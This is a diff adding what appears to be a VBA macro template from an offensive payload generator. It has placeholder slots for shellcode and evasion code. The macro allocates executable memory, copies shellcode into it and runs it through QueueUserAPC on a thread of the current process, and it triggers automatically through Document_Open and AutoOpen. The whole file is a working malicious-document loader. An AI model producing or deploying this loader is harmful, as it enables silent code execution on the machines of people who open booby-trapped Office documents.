@@ -1,0 +1,135 @@
+//####DEFINE####
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
+Private Declare PtrSafe Function QueueUserAPC Lib "kernel32" (ByVal pfnAPC As LongPtr, ByVal hThread As LongPtr, ByVal dwData As LongPtr) As Long
+Private Declare PtrSafe Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As LongPtr
+Private Declare PtrSafe Function Thread32First Lib "kernel32" (ByVal hSnapshot As LongPtr, ByRef lpte As THREADENTRY32) As Long
+Private Declare PtrSafe Function Thread32Next Lib "kernel32" (ByVal hSnapshot As LongPtr, ByRef lpte As THREADENTRY32) As Long
+Private Declare PtrSafe Function OpenThread Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwThreadId As Long) As LongPtr
+Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
+Private Declare PtrSafe Function GetCurrentProcessId Lib "kernel32" () As Long
+Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
+
+Private Type THREADENTRY32
+    dwSize As Long
+    cntUsage As Long
+    th32ThreadID As Long
+    th32OwnerProcessID As Long
+    tpBasePri As Long
+    tpDeltaPri As Long
+    dwFlags As Long
+End Type
+
+Private Const TH32CS_SNAPTHREAD As Long = 4
+Private Const THREAD_SET_CONTEXT As Long = &H10
+
+//####CODE####
+
+Function JustE()
+    
+    //####EVASION####
+    
+    'initialize variables
+    Dim ch64Arch As Boolean
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim snapshot As LongPtr
+    Dim threadEntry As THREADENTRY32
+    Dim currentPid As Long
+    Dim threadHandle As LongPtr
+    
+    ch64Arch = arch()
+    
+    If ch64Arch Then
+        buf = ####SHELLCODE####
+    Else
+        buf = ####SHELLCODE32####
+    End If
+
+    //####CALL####
+
+    ' Allocate memory for shellcode
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    
+    ' Copy shellcode to allocated memory
+    For i = LBound(buf) To UBound(buf)
+        RtlMoveMemory addr + i, CLng(buf(i)), 1
+    Next i
+    
+    ' Get current process ID
+    currentPid = GetCurrentProcessId()
+    
+    ' Create snapshot of system threads
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
+    
+    If snapshot <> -1 Then
+        threadEntry.dwSize = LenB(threadEntry)
+        
+        If Thread32First(snapshot, threadEntry) <> 0 Then
+            Do
+                If threadEntry.th32OwnerProcessID = currentPid Then
+                    threadHandle = OpenThread(THREAD_SET_CONTEXT, 0, threadEntry.th32ThreadID)
+                    If threadHandle <> 0 Then
+                        QueueUserAPC addr, threadHandle, 0
+                        CloseHandle threadHandle
+                        ' Small delay to allow APC to queue
+                        Sleep 100
+                        Exit Do
+                    End If
+                End If
+            Loop While Thread32Next(snapshot, threadEntry) <> 0
+        End If
+        
+        CloseHandle snapshot
+    End If
+End Function
+
+Function APCWrapper(ByVal addr As LongPtr) As Long
+    Dim snapshot As LongPtr
+    Dim threadEntry As THREADENTRY32
+    Dim currentPid As Long
+    Dim threadHandle As LongPtr
+    
+    currentPid = GetCurrentProcessId()
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
+    
+    If snapshot <> -1 Then
+        threadEntry.dwSize = LenB(threadEntry)
+        
+        If Thread32First(snapshot, threadEntry) <> 0 Then
+            Do
+                If threadEntry.th32OwnerProcessID = currentPid Then
+                    threadHandle = OpenThread(THREAD_SET_CONTEXT, 0, threadEntry.th32ThreadID)
+                    If threadHandle <> 0 Then
+                        QueueUserAPC addr, threadHandle, 0
+                        CloseHandle threadHandle
+                    End If
+                End If
+            Loop While Thread32Next(snapshot, threadEntry) <> 0
+        End If
+        
+        CloseHandle snapshot
+    End If
+    
+    APCWrapper = 0
+End Function
+
+Function arch() As Boolean
+    #If Win64 Then
+        arch = True
+    #Else
+        arch = False
+    #End If
+End Function
+
+Sub test()
+    JustE
+End Sub
+
+Sub Document_Open()
+    test
+End Sub
+
+Sub AutoOpen()
+    test
+End Sub
